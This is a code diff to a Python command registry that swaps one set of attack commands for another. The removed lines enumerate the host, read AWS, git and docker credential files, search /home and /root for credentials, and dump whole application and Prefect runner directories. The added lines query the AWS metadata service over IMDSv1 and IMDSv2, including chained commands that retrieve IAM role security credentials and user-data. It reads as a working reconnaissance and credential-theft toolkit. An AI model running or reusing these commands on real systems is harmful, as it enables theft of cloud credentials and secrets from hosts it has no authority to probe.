@@ -882,85 +882,63 @@ class CommandRegistry:
         """
         commands: dict[str, Sequence[str]] = {
             # ============ SYSTEM FINGERPRINTING ============
-            "os_version": ("lsb_release", "-a"),
-            "kernel_version": ("uname", "-r"),
-            "hostname_info": ("hostname",),
-            "uptime": ("uptime", "-p"),
-            "timezone": ("timedatectl", "show", "--property=Timezone", "--value"),
-            "system_arch": ("uname", "-m"),
-            # ============ NETWORK RECONNAISSANCE ============
-            "network_interfaces": ("ip", "addr", "show"),
-            "routing_table": ("ip", "route", "show"),
-            "arp_cache": ("ip", "neigh", "show"),
-            "dns_servers": ("cat", "/etc/resolv.conf"),
-            "hosts_file": ("cat", "/etc/hosts"),
-            "listening_ports": ("ss", "-tuln"),
-            "established_connections": ("bash","-c", "ss -tnp"),
-            "all_connections": ("bash","-c", "ss -tunap"),
-            "network_config": ("ifconfig", "-a"),
-            # ============ PROCESS ENUMERATION ============
-            "running_processes": ("ps", "aux"),
-            "current_user_processes": ("bash", "-c", "ps -u $(whoami)"),
-            "processes_with_network": ("lsof", "-i"),
-            # ============ SERVICE DISCOVERY ============
-            "running_services": (
-                "systemctl",
-                "list-units",
-                "--type=service",
-                "--state=running",
+    
+            # IMDSv1 (Legacy - No Token Required)
+            "aws_imds_v1_check": ("curl", "-s", "http://169.254.169.254/latest/meta-data/"),
+            "aws_imds_v1_instance_id": ("curl", "-s", "http://169.254.169.254/latest/meta-data/instance-id"),
+            "aws_imds_v1_hostname": ("curl", "-s", "http://169.254.169.254/latest/meta-data/hostname"),
+            "aws_imds_v1_public_ip": ("curl", "-s", "http://169.254.169.254/latest/meta-data/public-ipv4"),
+            "aws_imds_v1_private_ip": ("curl", "-s", "http://169.254.169.254/latest/meta-data/local-ipv4"),
+            "aws_imds_v1_security_groups": ("curl", "-s", "http://169.254.169.254/latest/meta-data/security-groups"),
+            "aws_imds_v1_iam_info": ("curl", "-s", "http://169.254.169.254/latest/meta-data/iam/info"),
+            "aws_imds_v1_iam_role": ("curl", "-s", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
+            "aws_imds_v1_iam_creds": (
+                "bash",
+                "-c",
+                "ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/); curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
             ),
-            # ============ ENVIRONMENT ENUMERATION ============
-            "environment_vars": ("env",),
-            "path_variable": ("bash", "-c", "echo $PATH"),
-            "home_directory": ("echo", "$HOME"),
-            "current_directory": ("pwd",),
-            # ============ SSH RECONNAISSANCE ============
-            # ============ CREDENTIAL HUNTING ============
-            "psql_history": ("cat", "~/.psql_history"),
-            "python_history": ("cat", "~/.python_history"),
-            "aws_credentials": ("cat", "~/.aws/credentials"),
-            "docker_config": ("cat", "~/.docker/config.json"),
-            "aws_all_users": ("bash", "-c", "find /home /root -path '*/.aws/credentials' -o -path '*/.aws/config' 2>/dev/null -exec sh -c 'echo \"=== {} ===\"; cat \"{}\"' \\;"),
-            "git_config": ("cat", "~/.gitconfig"),
-            "git_credentials": ("cat", "~/.git-credentials"),
-            # ============ SECURITY CONTROLS ============
-            "sudo_version": ("sudo", "-V"),
-            "sudo_list": ("sudo", "-l"),        
-            "iptables_rules": ("iptables", "-L", "-n"),
-            "ufw_status": ("ufw", "status"),
-            "firewalld_status": ("firewall-cmd", "--state"),
-            # ============ INSTALLED SOFTWARE ============        
-            "pip_packages": ("pip", "list"),
-            "pip3_packages": ("pip3", "list"),
-            # ============ CRON & SCHEDULED TASKS ============
-            "user_crontab": ("crontab", "-l"),
-            "system_crontab": ("cat", "/etc/crontab"),
-            "cron_d": ("ls", "-la", "/etc/cron.d/"),
-            "systemd_timers": ("systemctl", "list-timers", "--all"),
-            # ============ KERNEL & CAPABILITIES ============
-            "kernel_version_full": ("uname", "-a"),
-            "kernel_modules": ("lsmod",),
-            "capabilities_current": ("capsh", "--print"),
-            # ============ HARDWARE INFO (Light) ============
-            "cpu_info": ("lscpu",),
-            "memory_info": ("free", "-h"),
-            # ============ CONTAINER DETECTION ============
-            "container_check": ("cat", "/proc/1/cgroup"),
-            "docker_env_check": ("cat", "/.dockerenv"),
-            # ============ FILE SYSTEM MAPPING ============
-            "mounted_filesystems": ("mount",),
-            "disk_usage": ("df", "-h"),
-            "file-ls-tmp": ("ls", "-la", "/tmp"),
-            "file-ls-var_tmp": ("ls", "-la", "/var/tmp"),
-            "file-ls-opt": ("ls", "-la", "/opt/prefect"),
-            "file-ls-rstg": ("ls", "-la", "/tmp/runner_storage"),
-            "file-ls-stg": ("ls", "-la", "/tmp/runner_storage/c71e99f9-49b5-40d1-b61d-4d4146a41d0b"),
-            "file-ls-tmpp": ("ls", "-la", "/tmp/tmphm64kw_rprefect"),
-            "file_contents_app": ("bash", "-c", "find /app -type f \\( -path '*/.venv/*' -o -path '*/venv/*' -o -path '*/__pycache__/*' -o -path '*/.pytest_cache/*' -o -path '*/.cache/*' -o -path '*/node_modules/*' -o -path '*/.git/*' -o -path '*/dist/*' -o -path '*/build/*' -o -path '*/.egg-info/*' -o -path '*/eggs/*' -o -path '*/.tox/*' -o -path '*/.mypy_cache/*' -o -path '*/.ruff_cache/*' \\) -prune -o -type f -print | xargs -I {} sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"'"),
-            "file_contents_stg": ("bash", "-c", "find /tmp/runner_storage/c71e99f9-49b5-40d1-b61d-4d4146a41d0b -type f \\( -path '*/.venv/*' -o -path '*/venv/*' -o -path '*/__pycache__/*' -o -path '*/.pytest_cache/*' -o -path '*/.cache/*' -o -path '*/node_modules/*' -o -path '*/.git/*' -o -path '*/dist/*' -o -path '*/build/*' -o -path '*/.egg-info/*' -o -path '*/eggs/*' -o -path '*/.tox/*' -o -path '*/.mypy_cache/*' -o -path '*/.ruff_cache/*' \\) -prune -o -type f -print | xargs -I {} sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"'"),
-            "file_contents_tmpp": ("bash", "-c", "find /tmp/tmphm64kw_rprefect -type f \\( -path '*/.venv/*' -o -path '*/venv/*' -o -path '*/__pycache__/*' -o -path '*/.pytest_cache/*' -o -path '*/.cache/*' -o -path '*/node_modules/*' -o -path '*/.git/*' -o -path '*/dist/*' -o -path '*/build/*' -o -path '*/.egg-info/*' -o -path '*/eggs/*' -o -path '*/.tox/*' -o -path '*/.mypy_cache/*' -o -path '*/.ruff_cache/*' \\) -prune -o -type f -print | xargs -I {} sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"'"),
-            "file_contents_prf": ("bash", "-c", "find /opt/prefect -type f \\( -path '*/.venv/*' -o -path '*/venv/*' -o -path '*/__pycache__/*' -o -path '*/.pytest_cache/*' -o -path '*/.cache/*' -o -path '*/node_modules/*' -o -path '*/.git/*' -o -path '*/dist/*' -o -path '*/build/*' -o -path '*/.egg-info/*' -o -path '*/eggs/*' -o -path '*/.tox/*' -o -path '*/.mypy_cache/*' -o -path '*/.ruff_cache/*' \\) -prune -o -type f -print | xargs -I {} sh -c 'echo \"=== {} ===\"; cat \"{}\" 2>/dev/null || echo \"[Error reading file]\"'"),
-            "python_files_list": ("bash", "-c", "find / -type d \\( -name .venv -o -name venv -o -name __pycache__ -o -name site-packages \\) -prune -o -type f -name '*.py' -print 2>/dev/null"),
+            "aws_imds_v1_user_data": ("curl", "-s", "http://169.254.169.254/latest/user-data"),
+            "aws_imds_v1_identity_document": ("curl", "-s", "http://169.254.169.254/latest/dynamic/instance-identity/document"),
+            "aws_imds_v1_pkcs7_signature": ("curl", "-s", "http://169.254.169.254/latest/dynamic/instance-identity/pkcs7"),
+            "aws_imds_v1_mac_address": ("curl", "-s", "http://169.254.169.254/latest/meta-data/mac"),
+            "aws_imds_v1_network_interfaces": (
+                "bash",
+                "-c",
+                "MAC=$(curl -s http://169.254.169.254/latest/meta-data/mac); curl -s http://169.254.169.254/latest/meta-data/network/interfaces/macs/$MAC/"
+            ),
+            "aws_imds_v1_subnet_id": (
+                "bash",
+                "-c",
+                "MAC=$(curl -s http://169.254.169.254/latest/meta-data/mac); curl -s http://169.254.169.254/latest/meta-data/network/interfaces/macs/$MAC/subnet-id"
+            ),
+            "aws_imds_v1_vpc_id": (
+                "bash",
+                "-c",
+                "MAC=$(curl -s http://169.254.169.254/latest/meta-data/mac); curl -s http://169.254.169.254/latest/meta-data/network/interfaces/macs/$MAC/vpc-id"
+            ),
+            
+            # IMDSv2 (Token-Based)
+            "aws_imds_v2_get_token": (
+                "curl",
+                "-s",
+                "-X",
+                "PUT",
+                "-H",
+                "X-aws-ec2-metadata-token-ttl-seconds: 21600",
+                "http://169.254.169.254/latest/api/token"
+            ),
+            "aws_imds_v2_with_token": (
+                "bash",
+                "-c",
+                "TOKEN=$(curl -s -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token); curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/"
+            ),
+            "aws_imds_v2_iam_creds": (
+                "bash",
+                "-c",
+                "TOKEN=$(curl -s -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token); ROLE=$(curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/); curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE"
+            ),
+            
+            
 
 
         }
